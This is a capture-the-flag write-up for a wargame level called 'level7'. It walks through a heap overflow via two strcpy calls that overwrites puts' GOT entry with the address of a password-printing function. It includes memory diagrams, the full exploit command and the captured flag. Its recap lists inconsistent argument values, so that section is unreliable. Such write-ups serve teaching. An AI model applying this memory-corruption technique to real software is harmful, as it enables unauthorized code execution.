# level7

This level is similar to `level6`. The executable does the following :

- Four `malloc(8)` in a row
- `first[1]` points to the second
- `third[1]` points to the fourth
- A first `strcpy` ; copies `argv[1]` into `first[1]` (the second malloc)
- A second `strcpy` ; copies `argv[2]` into `third[1]` (the fourth malloc)
- Read `level8/.pass` into global variable `c`
- Run a `puts`

An `m` function prints `c`, which is what we want. We want to replace `puts`' address in the GOT with `m`.

To do this, we'll exploit the `strcpy` calls again.

## The value

Cutter reveals the address of `m`, our spoofed value : `0x080484f4`.

Formatted, this is `\xf4\x84\x04\x08`.

## The addresses 

By running the executable in `gdb`, breaking after the `malloc`s and running `p/x $eax`, we get the addresses :

- `p1` is at `0x804a008`
- `var` is at `0x804a018`
- `p2` is at `0x804a028`
- `var` is at `0x804a038`

Let's draw the memory :

```
 0x0804a008                                          0x0804a018
[0x00000000   0x00000000]  0x00000000   0x00000000  [0x00000000   0x00000000]  0x00000000   0x00000000
 p1[0]        p1[1] -------------------------------> var1

 0x0804a028                                          0x0804a038
[0x00000000   0x00000000]  0x00000000   0x00000000  [0x00000000   0x00000000]  0x00000000   0x00000000
 p2[0]        p2[1] -------------------------------> var2
```

As thing stand, the `strcpy` will replace `var1` and `var2`.

Let's fill the memory with what's in memory at runtime :

```
 0x0804a008                                          0x0804a018
[0x00000001   0x0804a018]  0x00000000   0x00000000  [0x00000000   0x00000000]  0x00000000   0x00000000
 p1[0]        p1[1] -------------------------------> var1

 0x0804a028                                          0x0804a038
[0x00000002   0x0804a038]  0x00000000   0x00000000  [0x00000000   0x00000000]  0x00000000   0x00000000
 p2[0]        p2[1] -------------------------------> var2
```

## The exploit

Here's what we can do :
- Exploit the first `strcpy` to overwrite `p2[1]`
- Exploit the second `strcpy`, which now points to our spoofed address, with `m`'s value

The first `strcpy` starts at `var1` ; there's 20 bytes to `p2[1]`.

We can fill with 20 `A` before replacing `p2[1]` with the GOT address of `puts` : `0x08049928` :

```
 0x0804a008                                          0x0804a018
[0x00000001   0x0804a018]  0x00000000   0x00000000  [0x41414141   0x41414141]  0x41414141   0x41414141
 p1[0]        p1[1] -------------------------------> var1

 0x0804a028                                          0x0804a038
[0x41414141   0x08049928]  0x00000000   0x00000000  [0x00000000   0x00000000]  0x00000000   0x00000000
 p2[0]        p2[1]                                  var2
                |
                \----------> 0x08049928  (puts GOT address)
                            [0x08048406] ----------> puts()
```

Now, we can use `argv[2]` to put the `m` function's value in the GOT table and tricks the program :

```
 0x0804a008                                          0x0804a018
[0x00000001   0x0804a018]  0x00000000   0x00000000  [0x41414141   0x41414141]  0x41414141   0x41414141
 p1[0]        p1[1] -------------------------------> var1

 0x0804a028                                          0x0804a038
[0x41414141   0x08049928]  0x00000000   0x00000000  [0x00000000   0x00000000]  0x00000000   0x00000000
 p2[0]        p2[1]                                  var2
                |
                \----------> 0x08049928  (puts GOT address)
                            [0x08048406]             puts()
                                  |
                                  \----------> m()
```

Now, the executable should run `m()` when trying to run `puts()`.

## The command

To recap, we need :

```
argv[1] = AAAAAAAAAAAAAAAAAAA0x08049928
argv[2] = 0x08048406
```

Or, from the command line :

```
argv[1] = $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")')
argv[2] = $(python -c 'print("\xf4\x84\x04\x08")')
```

We run :

```
./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
```

## The flag

It works ! We get the `level7` flag :

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```